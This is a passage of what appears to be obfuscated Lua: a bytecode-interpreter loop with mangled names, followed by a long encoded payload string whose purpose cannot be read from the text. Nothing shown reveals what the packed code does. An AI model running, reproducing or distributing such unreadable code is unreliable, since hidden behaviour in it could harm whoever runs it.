l~=29 then a[j[r]]=bx(m[j[ba]],nil,g)else local w=bc[bd]bc[bd]=nil bd=bd-1 local bu=bc[bd]bc[bd]=nil bd=bd-1 local bz=bc[bd]bc[bd]=nil bd=bd-1 bz(bu,w)end end else if l<=33 then if not((l)>=(33))then local w=j[r]local bu=bc[bd]bc[bd]=nil bd=bd-1 local bz=bc[bd]bc[bd]=nil bd=bd-1 local ce=bc[bd]bc[bd]=nil bd=bd-1 local cf=bc[bd]bc[bd]=nil bd=bd-1 a[w]=cf(ce,bz,bu)else local w,bu,bz=j[r],j[ba],j[y]local bu=q[bu]local w=a[w]do local ce=(1)local cf=(1)local cg=(#bu)if cf>=0 then if ce<=cg then repeat if w==nil then break end w=w[o[bu[ce]]]ce=ce+cf until not(ce<=cg)end else if ce>=cg then repeat if w==nil then break end w=w[o[bu[ce]]]ce=ce+cf until not(ce>=cg)end end end a[bz]=w end else if l~=((35)+0)then a[j[r]]=not a[j[ba]];else a[j[r]]=-a[j[ba]];end end end else if not((l)<(44))then if not((l)>(51))then if l<=46 then if l>=46 then local w=j[r]local w=j[ba]local w=w local bu=bd local w=bu-w+1 local bz=bc[w]bz(s(bc,w+1,bu))for bz=bu,w,-1 do bc[bz]=nil end bd=w-1 else if l<=44 then a[j[r]]=a[j[ba]]~=a[j[y]];else local w=j[r]local bu=bc[bd]bc[bd]=nil bd=bd-1 local bz=bc[bd]bc[bd]=nil bd=bd-1 local bu,bz=bz(bu)do local bu,bz=bu,bz a[w]=bu a[w+1]=bz end end end else if l>=50 then if not((l)>(50))then b[j[ba]][1]=a[j[r]]else g[o[j[ba]]]=a[j[r]];end else if l<=48 then if l==47 then local w=j[r]local w=bc[bd]bc[bd]=nil bd=bd-((1)+0)w()else a[j[r]]=#a[j[ba]];end else do return s(a,j[r],by)end end end end else if l<=60 then if l<=55 then if l>=54 then if l<=54 then local w=j[r]local bu=bc[bd]bc[bd]=nil bd=bd-1 local bz=bc[bd]bc[bd]=nil bd=bd-1 local ce=bc[bd]bc[bd]=nil bd=bd-1 local cf=bc[bd]bc[bd]=nil bd=bd-1 local bu=bv(bb,cf(ce,bz,bu))by=w+bu-1 for bz=1,bu do a[w+bz-1]=bb[bz]end else a[j[r]]=a[j[ba]]>a[j[y]];end else if l<53 then local w=j[r]a[w]=a[w]();else local w=j[r]local bu=bc[bd]bc[bd]=nil bd=bd-1 a[w]=bu()end end else if not((l)>(57))then if l~=57 then local w,bu=j[r],j[ba]local q=q[bu]local bu={}for bz=(#q),(1),-1 do bu[bz]=o[q[bz]]end a[w]=bu else local q=bc[bd]bc[bd]=nil bd=bd-1 local w=bc[bd]bc[bd]=nil bd=bd-((1)*1)local bu=bc[bd]bc[bd]=nil bd=bd-((1)+0)local bz=bc[bd]bc[bd]=nil bd=bd-1 bz(bu,w,q)end else if l>=60 then a[j[r]]=k else if l~=59 then a[j[r]]=o else a[j[r]]=a end end end end else if l>=70 then if not((l)<(77))then if l<=((80)*1)then if l>=79 then if not((l)~=(79))then local k,o=j[r],(j[y]*100)local q=a[k]for w=1,j[ba]do q[o+w]=a[k+w]end else local k=j[r]local o=bd local q=bl local w=q+1 local bu=bc[w]do local bu,bz,ce=bu(s(bc,w+1,o))a[k]=bu a[k+1]=bz a[k+2]=ce end do local k=(o)local o=(-1)local w=(w)if o>=0 then while k<=w do bc[k]=nil k=k+o end else while k>=w do bc[k]=nil k=k+o end end end bd=q local k=bn[bt]bn[bt]=nil bt=bt-1 bl=k or 0 end else if l==77 then local k=#j[r]for o=1,k do a[j[r][o]]=a[j[ba][o]];end;else local k,o=j[r],(j[y]*100)local q=a[k]q[(1)+(o)]=a[k+1]end end else if not((l)<(83))then local k=j[r]local o=bv(bb,a[k]())by=k+o-1;for q=1,o do a[k+q-((1)*1)]=bb[q];end;else if l<=81 then bw=a[j[r]];else local k,o=j[r],(j[y]*100)local q=a[k]do local w=(1)local bu=(1)local bz=(by-k)if bu>=0 then if w<=bz then repeat q[(w)+(o)]=a[k+w]w=w+bu until not(w<=bz)end else if w>=bz then repeat q[(w)+(o)]=a[k+w]w=w+bu until not(w>=bz)end end end end end end else if l>=74 then if l>=76 then local k=j[r]local o=bd local q=bl local w=(1)+(q)local bu=bc[w]local bu=bv(bb,bu(s(bc,(1)+(w),o)))by=k+bu-1 for bz=(bu),(1),-1 do a[k+bz-1]=bb[bz]end for k=o,w,-1 do bc[k]=nil end bd=q local k=bn[bt]bn[bt]=nil bt=bt-1 bl=k or 0 else if l<=((74)+0)then local k=j[r]local o=a[j[x]]local q=a[k]local o=q[o]a[k]=o a[k+1]=q a[k]=a[k](a[k+1],a[k+2],a[k+3])else local k=j[r]local o=bc[bd]bc[bd]=nil bd=bd-((1)-0)local q=bc[bd]bc[bd]=nil bd=bd-((1)*1)local w=bc[bd]bc[bd]=nil bd=bd-1 do local o,q=w(q,o)a[k]=o a[k+1]=q end end end else if not((l)>(71))then if l==((70)-0)then local k=j[r]local o=a[j[x]]local q=a[k]local o=q[o]a[k]=o a[k+1]=q local o=bv(bb,a[k](a[k+1]))by=k+o-1 for q=1,o do a[k+q-1]=bb[q]end else local k=j[r]local o=j[ba]local q=a[j[x]]local w=a[k]local q=w[q]local o=(o)+(k)-1 a[k]=q a[k+1]=w a[k]=a[k](s(a,k+(0+(1)),o))end else if l<=72 then a[j[r]]=a[j[ba]]<a[j[y]];else local k=j[r]local o=bc[bd]bc[bd]=nil bd=bd-1 local q=bc[bd]bc[bd]=nil bd=bd-1 local w=bc[bd]bc[bd]=nil bd=bd-1 local o=bv(bb,w(q,o))by=k+o-1 do local q=(1)local w=(1)local o=(o)if w>=0 then while q<=o do a[k+q-((1)+0)]=bb[q]q=q+w end else while q>=o do a[k+q-((1)+0)]=bb[q]q=q+w end end end end end end end else if not((l)>(64))then if l<=((62)*1)then if l~=62 then local k=j[r]local o=a[j[x]]local q=a[k]local o=q[o]a[k]=o a[k+1]=q a[k]=a[k](a[k+1])else local k=j[r]local k=bd local o=bl local q=o+1 local w=bc[q]w(s(bc,q+1,k))for w=k,q,-1 do bc[w]=nil end bd=o local k=bn[bt]bn[bt]=nil bt=bt-1 bl=k or 0 end else if not((l)>(63))then a[j[r]]=a[j[ba]]*a[j[y]];else a[j[r]]=a[j[ba]]+a[j[y]];end end else if l<=66 then if l<=65 then a[j[r]]=a[j[ba]]-a[j[y]];else a[j[r]]=a[j[ba]]>=a[j[y]];end else if l<=((68)+0)then if l==67 then a[j[r]]=a[j[ba]];else local k=j[r]local o=a[j[x]]local q=a[k]local o=q[o]a[k]=o a[(1)+(k)]=q local o=bv(bb,a[k](a[k+1],a[k+2]))by=k+o-1 for q=1,o do a[k+q-1]=bb[q]end end else a[j[r]]=a[j[ba]]%a[j[y]];end end end end end end else if l>=((40)+0)then if l<=41 then if l<41 then local k=j[r]local o,q,w=a[k],a[k+1],a[k+2]a[k]=f(function()for f,bu in o,q,w do e(true,f,bu);end;end);by=k+2;bw=j[ba];else local e=j[r]local f=bc[bd]bc[bd]=nil bd=bd-1 local k=bc[bd]bc[bd]=nil bd=bd-1 do local f,k,o=k(f)a[e]=f a[e+((1)-0)]=k a[e+2]=o end end else if not((l)>(42))then a[j[r]]=a[j[ba]]==a[j[y]];else a[j[r]]=nil;end end else if(37)>=(l)then if l~=37 then do local e=(a[j[r]])bw=(e and(j[ba])or bw)end else local e=j[r]local f=j[ba]local f=f local k=bd local f=k-f+1 local o=bc[f]a[e]=o(s(bc,f+1,k))do local e=(k)local k=(-1)local o=(f)if k>=0 then while e<=o do bc[e]=nil e=e+k end else while e>=o do bc[e]=nil e=e+k end end end bd=f-1 end else if l<39 then local e=j[r]local f=a[j[x]]local k=a[e]local f=k[f]a[e]=f a[e+(0+(1))]=k a[e]=a[e](a[e+1],a[e+((2)+0)])else local e=j[r]local f,k,o=a[e]()if f then do local f,k,o=k,o,j[ba]a[e+3]=f a[e+4]=k bw=o end end end end end end end else if l>=((23)+0)then if l>=26 then if l==26 then a[j[r]][1]=a[j[ba]]else a[j[r]]={};end else if l>=25 then local e=j[r]a[e]={a[e]}else if l<=23 then local e=j[r]local e=bc[bd]bc[bd]=nil bd=bd-1 local f=bc[bd]bc[bd]=nil bd=bd-1 f(e)else local e=j[r]local f=bd local k=bl local o=k+((1)+0)local q=bc[o]a[e]=q(s(bc,o+1,f))for e=f,o,-1 do bc[e]=nil end bd=k local e=bn[bt]bn[bt]=nil bt=bt-1 bl=e or 0 end end end else if l<=20 then if l<=((19)-0)then if l<19 then local e=m[j[ba]]local f=e[5455]local k=#f local m={}for o=1,k do local f=f[o]local k=f[2]local q=f[3]if f[1]==1 then if not((q)~=(0))then local f=a[k]z[k]=f m[o]=f else m[o]=a[k]end else local b=b[k]if q==0 and b[((1)*1)]then b=b[1][b[2]]end m[o]=b end end a[j[r]]=bx(e,m,g)else a[j[r]]=a[j[ba]];end else bt=bt+1 bn[bt]=bl bl=bd end else if l<=21 then local b=j[r]local e=j[ba]local e=(e==0)and by or((e)+(b)-1)do local b=(b)local f=(1)local e=(e)if f>=0 then if b<=e then repeat bd=bd+1 bc[bd]=a[b]b=b+f until not(b<=e)end else if b>=e then repeat bd=bd+1 bc[bd]=a[b]b=b+f until not(b>=e)end end end else local b=j[r]local e=bc[bd]bc[bd]=nil bd=bd-1 local f=bc[bd]bc[bd]=nil bd=bd-1 local e=bv(bb,f(e))by=(e)+(b)-1 do local f=(1)local g=(1)local e=(e)if g>=0 then while f<=e do a[(f)+(b)-1]=bb[f]f=f+g end else while f>=e do a[(f)+(b)-1]=bb[f]f=f+g end end end end end end end end end bw=bw+1;end;end;end cc=-20982 end else if cc<=50453 then bp=nil cd=cb[3]~=1 and 70976 or 89224 cb[1]=(cb[1]+1)%5 cc=89224 else if cc~=58842 then bk=function(a)local b=0 for e=0,1 do b=u(b,v(d(a,bg,bg),8*e));bg=bg+1;end;return b;end cd,cc=-12024,-12024 else bs=nil cd,cc=-49295,-49295 end end end end else if cc>=82175 then if cc>=87607 then if cc<=87607 then bf=be([==[q1SeK7Ss-cJF>[BoT/tNnc',>4N-b$s8W*@o)Jais8W-!rsok8%s>ri+[=Hunkb,>s8W*dK`(j;IHV1VqENK'6[e/p+8Sh6TgOMD(&Ca^51H8:'fo=X:koMqqEorH(&C-okX1%f9^"0=_gL)j@Ddd.(FJMKJ%2]jmLT3R_M:5>LCpWGVQf$s$;N:,4)DE'nX/57$g1&;p;d1EruX#7ruqCR+o`&f1=Z>RkYQcM:koMo3n0ijLAETt6AGmg.eJKWFK#5$Tu2Tp(&C`M6\Q!bqN.B\*@aa]0Hif=$5r,jru^M:*@=aQd-l`!'/iNt$EJpg*EGNL->]X-JpG1e$2\/J*[[s13p`QlYR;e"(_%Kt%37pbLCpVk@7#_UCM3pQ:Qhn,b?tGR#Yn<Yrl:'!+l`MFieN>F$uu1VnW4oSmi`2REWROX6%h?ga:K:g&;SaETn`IV+V4,C+^[)pa:KNn&0^f.+[^qh)'WUI:kkVHl):9a8b;q5;FBk&JI:Z-MM+6L#RM4Q$)s!g%-/"X,*<0="W9'f&_\Z"*'o:NTL*n=$oNtd6tkmO0)(n0@6(b37L]+Te0Z?Gb89?e5;5$b8Y]3Wp8%L(.UF)53GV<N+F\b=ghL]WNpDEb)&C[F0IeD#RKuU/3&[a./hE>tUC&pE@';CMOT^@oHhQjEhXg$k#<rmYqJ<K^q(j<J=G[;kVSZfoKV6E'K<l7SLVTWO!4Z8[JU[F'Wir%@YYGr^;E0V0FLV?SKYSc>jG]`V3hf`\WaZYGKE?,H&tQjp771R<U5B_B&-;oc+V^Zj6duu,U*O=VQm.>Ud-50k6&XJ2(C5`!,F1c?VEg_$"QbIqC/L^((:@+uL;63m)2]X=724\_,1)i+iA'Th.L!a'(d_@N$:%*\N%RFN#R6)BiiN=b5VYASK!n"%Ob+c"<$Dgs@?(nF,6U=7+pJ5cR\1;oR]'D@#QZ?9q9,iX9oLI,\Q1+D,K(1IckHZU6tk4)1dm-0SI,PR+A/>`jJ#$e9JE4C'*QGjJ;QktJeF:o&Mu?VoEYbV#U-QO-kHG'.2G4K)PSBg6:.Xa1drPj:b30ZO8q+GdAfb7IFG9$703^ZKHP+?S^'.>G&@n"l<2b'Z8g,J[X"VXhh)UsNt)?G7>dI2[W+='GaT1Ie-lBf[o"9#K7P]jOlaYd$./mlr_3YBKFMLG1*@%%pr8+@``*)V!XT4M+=**n@#b4(cpS!n"Md_ubRo(:JIX,(Q,M]b_S^'o"_8)h5qo*e6_7uDB5FdhJ]YRKX(EOZ5)L%ho*Br)!J7)[JDRgg1nqe&)<Zj2%XJtG!q;@n$3c<g#m)H&CoPjF`-sEb<C6sXRBTY"$.V:n2&WNQ?l^te1_U=_ZQk5<[5&+U<RWY)7O56l/5d'-!i%K<%T6[?%C(QlApCn@"t+.V%Ekkg=_E^l0OgQS7ZcH+>+?3,gfXeEW.G^;2`Pg4Geq)"_'/=dJk$VDDe2IdEpWQPXW(=V%#HrEU7OboX@OblXnGT7<C8;be>NsH"N6u+Ua\(S_1?WiR_7F.''mskcI9/LGgp-$c%'e#=e&Ml,k&r7Qa%EZ;ML]dYt<G2>nG+OhpNPnGoA)f&[kE'"mJ8Ppt,Wm.>rJK9M&?ZGm#eQ''AQ%&Z0t,2'*Dc264_'SHNUM`&+T^,>en$FsQ<^Sr"a?[?/c"BS9td?.:8]f-rW$6R@lW8gbfG;@.1c]/EMJ)R/[>-NOWf^s@o/5$-Od_ZGh98XlbDMS;?`=_@BOigdm''6XQf'N%<%e`5H%NTj7R`(=msNVGoaI`T]C1/u51k\rmL9R7oG@RfTQ'KI^DIE?UX*#E6+;.u2fZ`$aMK3#8.J.lgTKR8-l@WYeDTfNL?Z%p%%X-%(.f1`/O&GiNS`TTpfQ_%M=OqbB]Bgjok.dg@*<t^E$UKcU4f2!61=@g!0G`F?kEd53)77gjIBsEoScqDQTWb<)FUL=c_3YL,-=Kbmai:9,@<tl@bW_8$'@jD&\!>=0n?*n^n[McUd,7,1?0IZ+D#!75XW&0]#9[NqaVP*GK7G&E'f"HX"<D1Gu7?(0*9rog3AIrkL&g[,c&qoUF!Yt#Ga!Ll'QB8@aXWhqiA5V1HE\M(-EtkCD_eO$FRiuNHQ/sJ!]uJHifeC80UBPEOa-mX3l]%C1$8pFu`BpR>YG;bK1:8Z0MP8d[(c.jh0Li%<\)hRR5t?dG"1H9]1p]Z,0GWATBkRYk15%)(SFrS"(-4tZ]@>=Bj2mP($(Esk/A]7P6#+7rG3BLbhN4Jj4m6.-=I%MX05.eW:_e:bh6`]Fd3Gkm():B("[jV:/&h%3%;%HYntZoQe9F4^\ge^0(bNeA[:gsjB]RYSd:Ob`*J5%+&oQ&U+RE93O^M.$j!G\3;kV'OgR4`@I1RN/6;U_OYrK8-3JfNo-pe09_qCDY9U1#<p5rb_+Mh`[e_u=YAiLt@Chde!'"^H%#qJTh#Y^'-Ul,[pM]Wd0V/-lmR8Pr>@i.!HiQNif%:^H7k^4YUBUab[*P*A`lbe[,XD1'6/G=lu6XhY`ab+1h(,a.[AUTPMkX6ZD)_="%PJbVUYhl.[#T>.$>n^ed#.'WcL2JPDB:@Bge!^$=hf`Wg8+RkoEJGsRc:OWcLnHW',-f-g#&SE2;C7M\SN,P5O0]No3&&QAD5cKkRb&Tu%ah&4as'QM0N9(@gmcE#:b<8$d2Zq1Y8ZZR5V'i^7[of"$!C1:H;,$;YZlNM`Wg/kQ)Ydp,MlB6?/u`a0^ha`F0DRm*IIY\YQcru9A2DSatZ1@Ncbb?iID:p)bXq,6T<qgU$_Fi81%b]4378C8%700*S&<Rh!X.&RkD,R\hJqDELQUO9dML(=KtW=*mb:Im]'PWAlL(n1c$\*[@#X?if%t`bX*,%_L8*kJVbO$"Y=IO`"JC"ZNLAY=5\1<i[W';)Iq$FGCZZ4KE?jq'A+dWFc3NM%4,^Oj+'[W=H<MM%6L[O=^LF\Ro^?MB']tX?=KB`0A+TSQdAK*?pYR47`)13K.'p&:\52+&hlZ!2mK=J;PM5!K$)-rKpDkdTZ#Q[gkhj-9h?'n/^%hEAtU%J/=WTEF54g!"Cc-071:k;Jk4<jF)[X*&00'-BVDD!=Qqd.,87"Z@Nd.\eJhP'10#:)7"&MWXG]@0Tl]3)6EaugNoaD26np;!Ab=Vf(rj_6+dcro1E]EX,ZcW?btM^5E#COjQ`DU!j<E00Nnr`1")O4@`2PPp3;1Lo+:D0MU;2A:f!:AUA;t26DB)\7/Q#s,7o?8+V%q^W)Z!E+#0I-lQs2CWUt>AOAXLs[=H"P84iC/c2q0M).M?6N(2fUK(10iBbWoKkI+`-]k!YgY)Cn`M635h,:(rEBH9&;f,0L]k*,&GsFsp9B=>WK@#VE&#L([5UWH:b'D[C=!Lj:gjLdb>9;/]8S<bapP.1;B@W>LA(W)-d)Z%s:<AhZ2*0d^X7$8c=&#hZ"B#_KF1"//!4-9<)reR59k'W`K(;D=3LfeN^t!X'sR,CmfG+c<4X"GK##2hGSF5QE25-t0_Q7fr1Y[!=fm$e##,Ujs6i"_lG9ZjY#*$R_a+#[&jC2BiE8q`.3:#c,]H;Ikl`J[B\f$44h+K+o)aD<?+AO>`tR^]FiDlOhks*bk4MUu3B_eu6$#n$/@FZEUQE;kU8t/?md('EZ(ECJGeeU1Kfu63)TO%&?ULO9G_8(e@LI(+2^FJYj59:glYD'W2qUBU&u8eReks1P#N/Bo`I4;s0G5Jq^T-5haOMg7L[bKoB+8Gb(TVYAW0CC7B<OSNf)s\Dd+l@H$:I=o%p:#u5WgGYi=]J)lDO[qYp[orKL[ZOG;1j8iRuIl63TC6e$4iF2Fr9(qf6K0-=r0SFKd#$a36$PV<`WN=PEK6fd3(+D?`66^qAKZ+R%S40_[:'k-Z7<8`dJ04j[\q"$T$=seTa[1Om#Gb'$!XJkC/#L(bMh2nZ/r?1L0"0>g/mTIA;srE<`7SVH=_"V!*jLLR\@H(QA-m?C7i&@aJEfKM_Y.RABsU+2=HF(*KLCX3Sn\g'8-j_g#XO9.":.R!6%BM5+@KU53JBdc&@bILW]6).8-4AS+Td4Vco_A`+<Ui>#`1fkQ9mtN+scjr'+uI9aaAhP:_47*5Th34<ssnA+=%"TKZ'Hs64sDe&<\.]&V?)e,_SRA!$QqZ5_p!(;[fHr#QcP[Us1Hda<5=05]D'@&uR=T+b1]FN[l<h6g1C=Qm)NV63%f<*^:.EkMcOde?siX=-Q.+"F),)Q,^?uI/"1Q3dkPSXPJ?8ZSS@h!Mop2S-Q"dFGmN:5mRO3,_A8m9TH585#&OJD9n\UX4Jas].m<34Xk%GP;B<233O>=>XRc$q292XY"[kMTj3:hLBn5IG[;l5;mRo,;0UHZ&8TRj]s)lf"&>J_4!*4>:sNF]J\$4EE9..$5r0'?5Y15j#([c+<Jm!CE_f21Z[!@I-QA=r<d%S-L<NtqE3<S8_bOMhGNCfb'@^?1"*U]nK`cMHLBNBEe[q08`QFi7+&27-=^-<]FC=pY`u;JBm5jj[[GC^%hKsG?NW'0$(qdKA%]2>MhDp(&ha;b:jKoACD#"+BHA>5O\p!Vbq-/TmTur`*TTEW6+:&uZ&.f*Q!D"F\nLeg<#[I,;9%.?I.p!cn\4jn3?kG[h2^g--;4KDtc<F7TGRXPX:(+]rj4m5V-oM(M&H[PSch^XG/m[/p(E%:S**i6ZY/sjR=l2+.nDqt7.1./f3]XHlH+)1EhBm05>W0/akM<m\o]RWadjoQ4o?\XQk:4.pEgN>po<->D\)#D=OKjdP#_IRL6kG%Ekt@0miV>oD/mW!6\E0*h=bM^iiYA.^1lk^>qpX&pH@m/s/(''O9m0!:lKU5]MIM!;_Xij5\aKC2-!<[K"$sso5n^f=aPmI++^&=e&4B7gpn_aB:N*pm<Wl$N4&/a*Mm%kmoq6?E/tJ<oprkTSSZ$!l96R06N:%*9XVPYint**TGbQQ_(+V\,'GZ9,!WlhGEMjF;Ph<XAI5C#h^"&Bg?k)h3$mR.9XQ^:_K&\5VAa>=H<Q)&-0#p-aE918lNM-Y8"Ap?K:,O\2HH[jslofnD.un!^On,UfC0]R*>qhY1eTfR+)>@sZWTMe(Atp-M65<sE=eL:aNS@f_G;0.XT"U^XE[g22rA#ajH>LRU4+1)@-X#co\2?b^5XGN<$Ap#q+=+IpH<rsk$`7qC\oHpSSihH#!mOj$U$/3g,@ZqIYF+IOpr]G&-^n\nV*gPGkn]_F,D:^tbeafFRu]*oAk;?Va.6D?I?eQJVHpoU[^E]mX!j)S="FAOI`>4MdIfJ88smgeNXnjrdPRL^_nei+M,"=AOP//W\$*dBCG?2C&eIQdb`.\i3\@2d%A>2__sWL3<ZP,<n)<%8k^b@>NX1rQ+X%POGAd0gc>7aBkU[W$\qC1r:>5rdFCj/3740]I+bDrjnD<)p`iLDG?=#><^&RW961T7h_aA$Ccf,]<B1OG+NW;?F!QWlc.JCaMGTc<*UKNu/S2QAc&BDd87Dq2V&j_W=J0:n\CIg_3!eQEu`&(5^d%DNn&3pd0!C7h6UbpV!)mlrT<j!u:/cpnA=qYdmBgbY6p/F_X<5S(+..*)U`]uM.j$#K)Wh"=;j&1ej/hnI_;B-5Jd[9L,.[TQE5Be\L!<iNak@9"<.p3KARZ/g2fY2u9P`PqP63O&^;F$AD9H%dSk0Ah$NllXn![3:(*(ND!0G,!)KL?pg"@5?d8:a#370J3M+$r7:KFlfW5.^*;Pp.UW"X-2<M<ro:&$?s(YOhl'R6BgAN]=DKCg"W/fBUB?4_E)t)O*Jo"G2:n[MaW+b:.#"-"a0-+pfe^+XuK:5m\,I&/%:;$EE^Aqu?a)"G%[,":\9s'r$MG#R#_j^qOl\iP'q+qg.X`mSH:O;BR>T#XOP&QWG.DC?SbX5;M``C6#!P6:-316kH)K&-N$0:ll6S6;iIJ"9K_i#S7-sq=,;U6:aEkob7Qq5_',3,(q'A#RQ/P#c(QF_kUtc4$o&8!X-=[,YAULZ=o$L^Ah6q@3H0p"H#SI!L%"'!@[:``]sSR+qVD?<**37.4-0i67=7&>?Oc.#S@2Bh^nt"JriD'aPI.RMZtJ[Jg(Ld&9uS.KE?`:5Tg=666ZPa+:nS[M%G>.8-C)e+:t>F'*t6:+Wq$r!XJin+:*Q!#Qc+SJeSurE$.RN.38bH!!7`p&>V:9'F^d.+N4C*![.k:KEN_>,QrcG#QfSX&-N+b&kLD9Lld9(%$JR2!J3R-((#XbO[&n5KRa%("9Dn+2$+<p#sgh<,(^LDUdtId+Ts5@#hW'L$3c#(6ja&p-kHM1*^kgG"9K_I64tCPKFe8/KKoMC;C%?u!D($l&-N%?"=XgOE?L)<;D^oM!'q/?7#2B[&V?OB[CGYF<Id7WBS&P^Jj9kK6,4Z*6h`%W.7+1#%*mK+<K[Uh5mZg+-4#H9:GINU+:*R\KE*/-&dT(9&0`5BJKQ'\!?haT!XMAJJ05+/KEqhdJIk+<KWq?k!C6\d#RM%d,i$/j'%CPb%"omBOsgHb!"]8EK]JF5!<qci!_!`R!!,@s+:.6/Lk60>I+0?:":-h."G-UZJd<Mf!)jRD+[TX61I2T=.7PGqSmhs;,%TXtLd6J5'GNe<<.R:G";$5S#^_F8&Tj-H!_&7XM'.Ho+9[?c+@HK%&g.Gk+qPkVB;J]S+b5(c#_5/_6kBJe5_+A-6qDuaJ.P$kKRb0N&O;-p,T7j0+V=uO+:&*9\->6P6m+f_M#GIgBEZ'GE4CS/OR'Tj'47cDAje=\6uu80$&3SoBX4m:'PV-AE-P3T<#ueed9o]\Tn-iM7n8&HD%\62jr6HTFG:Qs92$g4emVCJ`'EY4"%*g(*X<m_;1qCA8ej:ZB`hra%C'Bb,&T>K8Ih^QQ%H0g\H"ZV)7C^jI+:<qS)+aNCpMVG<B@-W7jBuKVBQ^[^X)b,Bh2`)hh03W6)Zc-MBF1pU+f)S*RIWk=fN=4m:p=^,\l6a<R9?T1!mS$0G4Mg?E%TK\TsUA3)N2LU<l;"LoO?Mg'XYAM3*=L,WZQ,U/?V2U'jDpZ"Q9T-jC:bH;Q%"/Jk1>VFhb_26%!p]rXSbLd[">D.Ss4R[T7[An^P0BPj6[>VtI@VWOV`cXDD1&k=u:8$IL]VSqC8"DCC/"=Xu9;bT_+j=ZDMb0=,pc.YWS$p(7VZ*Ho_,^A(*2hg1AV$Ncg5S9)eht7+LUdu7%9_!oT!+4\.9(Bo9Cnh:@k]R;c<hE['Gko@+p>%?`"AHI?/g\jh0Fq;?+b3=D,$CiY5n"6-Oi94X9/O1[(#UDuJ7p'6DF?BUDOc7(3=OK>.`@.JNT2M-O]iHuZJ3GMMkk_K,"g4OZQ(M*$BfbQ4k3#mHpYml%Gl5\?\-!4N`BQ\&*l=ecrt+^6',fV>V"?79upT'\XWeaj*4?*G<L8X=m6?AdQp>i@K59k5%FRI<iCiuH;>*J=NcO%djb[HTF,5Op1'?*V[ll:&;4n2OMm`&KQr`764*l^fVXGCK14elURjp?O9LjSgEg>X;D:U_,S37l:f&PCS3[K6*)J*2I0=5>ogjXf+@u$^+:&$7M?<oGM?Z*EY_<8qd\NNA"i>e,ZFV2];ZRH<CG5I6,VmC3=`hTf,;;Whg+&t2L),1b[(qMQ648[d13u;U-pe9C^n:t\B[hj<TF$W["U0Gd6X!-*"F)]!(_f"J/C@<<U_n4))8fK?6),QW`YqK,)T7Ng$)m?MH4L)Lb!JP'BX;-:/de9(VMA]O)PgZu3!mbR+:.J,&do8'&?=9uCm_59E%iC75lg=l&-OHO,NR;7_[jlc,<&'\b6O'dBpI\&Z;=l\k/ioeUKIAOB[0!VR!lS*$&_nN$<pQ>fBWII\#4F73]%VXiQshl6m4OC!*I(N?I/d'A)JrNROA0Y?pku;1T1cj8][[M`Pr[GU54p#Qt(-QB.+&j<1sMX!_J([Us0#K6'1eY_@p6=ViF]`XF[$prgY2S%rEQ#RTVcl3'<ASdDZOu750ll%C.r;Ak7Kg5QME`(?`?n=j-MU0Bdp4(SJ6*,<@1bM@7dMd:u4j:gai$,D&</$5!m_$SN^K'Le7-Z*>cDKP1B)3^of&Mr8+/JZh%#!$)i6'NYQl&:r\7;&GR+,hqNZ>(mRj5md_u]lp0p<i64[:/qBn7"A/p;7-OE5mim?CnhB6`&-mG7777i78Zn6'_M_s,70)&]]i]b))MiZK=i"O(D1<F`-#;K`dY9,@?(?$@>UZb"@8-$[0"0sBNRS$"4B[%"S<rI*cs_CBNI20h^AP]OZ(WU^k;m?(nh8?au'bH6Es#-H%@(<1r0=2KHu-lQm)Ms$E?oFD,0Di';?)dgaG3E+V;&[@L8L=09ZCI@4tYL@1ae6^]NKd,&QTr3eg1a004_%8:uqS&nk_//bl%V4R=pd,*JZV\9Ub]n7ZJX4BeA8WMSkL46<VH'+-dR'Vo[Rg[#_JJf"P#9Mn\>3@#ep$<:c)/<2TDJhhQQJJiT,Us0R[bn?/U3<BXUY:-,9!h:qg`-KNa:V/P_'#:E0!$".VLE;!rg`D&7X,o5XM@dU*KS!#cLq,s:_AeVf+phNF!u2sd+eaRC<!@!1S)CD&Yc*^B7";tZ.)#1bOMXrT-*`]TA.M/8F;bT!KJkZA78Ga^2ZgF%6pM%m$S?)!"<qZGM%B^oM[]\U,=JVh(0<%jJeWBs/<JLRFXSLe&LgJVWW35oaTtc:RXra^6W,!671+nd5BRYU%qA#s3Jgah8ei`tM[:Pb;(0<Q,U`d$#baa:1kp]V'[<<OLK%EL@BtCi!N@!VV!L7(Ta_i@9#!6X764k9=h`G0Fsdu[E]#45cnN9,+U]Yc8/d-bb8E%=:MbP^@^/%R.5^K2Lptq>%-4!c'Hs8S8AX@8/09@nL:t5sLil/q%@YXGO9-XWXJ1O55c@5iX?EW&RnCL5bZKf<D.qHl4M5LP@U*"IY@AI^SH&gBej<cGFbTsU-:J[<A44jc?K@E:":B_\0O`'@gkim.R_ip3$,m+/a.oE'54UCu5q`58#f(;e#usBK'Kd#`)DVm?8HsmQ3"R:4_Gr1=(_?bq$sbE#;r(R>KERr<!!E>\PdMnVOFj;7Pjr:(/BL4S=9O.?KZ+$B'!%+G>u;A-,W[>AO>`HH64'?I#Qd*)iiE;7QrP=7<ST,3JcLc5#Z;q0,!??;S.#HT"R(ubH)*\+.@Q?M+c)cu-DY#lK`W^;#uXT]694A6:e;!lI#A[VUgP=a2h@'--BLPtUlEi<Oi/FN!<aj3AT;*t+:1Af!'pSjdUn7?!C[:Kkb!=roS4OEs2RpLNqo$6rVF]^2SAW:^[YU:o;`+<lGssB%u"oV'@tJ["]sdJ6eMA$Bc?leS[fE(bi2Xtg4gmS%Cl",AS[!*Y,t6MUp=X4$T(!Bm#&`kkeXl`oga3XjMA-DXP:>J7]V[_>q-(;?8N&a5O:mQY3B;(Fq(>'kAOVp#[W>T441C8pV*cQ[Vjk_F2F=M="N/?0AS?EgsJ'ZF&0.sQ12s]IJS.@J*qYZIdX=F4SSE=JdiL)TH?(3,fVCC_EIQaXOY*IN^,qc17#:^MZ!$,I-,'[4TFIqT7$1>[smniM_G,(=+C4$OJ!`sr8(6,ITE5Yq"f&(!4OK5Fan`#lb]A2/IV7>P<]*,cej3MB@$S9Xf$[?kP,j#qn\U`rnpG!q!qLN`Kbucr54kmq>'K.qrMJ*qo`&j]D_!_s5]16?@D5*B9]&#!<;oA8A+uIB+XRHq:7>k$N'NU5Pr0AlHb*\hKeq9=24E&'&[C.i!2^Xr-P`"It.7S[lu</^sX1:&qUum#QfK*HjM59#_)R!Y<PeaYjq^:a>V@/Dh%7D&qD(=n7Q9?p&'S;n@_U0!8mcP$%,7"J+SA;T7$H=MSK_MVY`[]^J+c1&]"$QZ>cGND:n!!YAEZWoa:,2;V81F+oi:PG\q#S5h\mS"em*UJo(YoKtp'Ii2e%)MA;pXXZ$iBF!9:cUP8pZ8.kkj!i/QXOeQ\0[f7^cRs3Hsi/Sgj5(7Y7f04W>a<O"MimL$e